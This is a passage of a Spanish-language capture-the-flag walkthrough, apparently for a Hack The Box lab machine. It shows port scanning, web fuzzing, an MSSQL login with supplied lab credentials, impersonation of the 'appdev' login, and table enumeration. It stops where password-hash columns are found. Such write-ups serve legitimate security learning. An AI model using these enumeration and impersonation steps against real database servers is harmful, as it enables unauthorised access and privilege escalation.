
La maquina nos aporta las siguientes credenciales `kevin / iNa2we6haRj2gaw!`

`nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.129.12.215 -oG allTarget`

```

[*] IP Address: 10.129.12.215
[*] Open ports: 80,1433,5985

```


`nmap -p 80,1433,5985 -sCV 10.129.12.215 -oN targeted`

### 80

Navegamos a la web y vemos que podemos crearnos una cuenta, mientras tanto hacemos fuzzing con 

`wfuzz -c --hc 404 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt http://eighteen.htb/FUZZ`

Con la cuenta creada vemos varios campos donde podemos introducir algún tipo de dato

### 1433

Nos conectamos a la base de datos usando impacket-mssqlclient con el siguiente comando y las credenciales obtenidas `impacket-mssqlclient kevin@10.129.12.215 -p 1433`
Para ver las bases de datos usamos `select name from sys.databases;`
Con el comando `use` podemos seleccionar la base de datos que queremos ver

Vamos a buscar un usuario al que se pueda impersonar
`SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';`

Impersonamos al usuario con `EXECUTE AS LOGIN ='appdev';`

Enumeramos las bases de daros `SELECT name FROM sys.databases;`

Seleccionamos la bese de datos que queremos enumerar `USE financial_planner;`

Enumeramos las tablas  de esta con `SELECT TABLE_NAME  FROM INFORMATION_SCHEMA.TABLES  WHERE TABLE_TYPE = 'BASE TABLE';`

Encontramos columnas llamdas username y password_hash 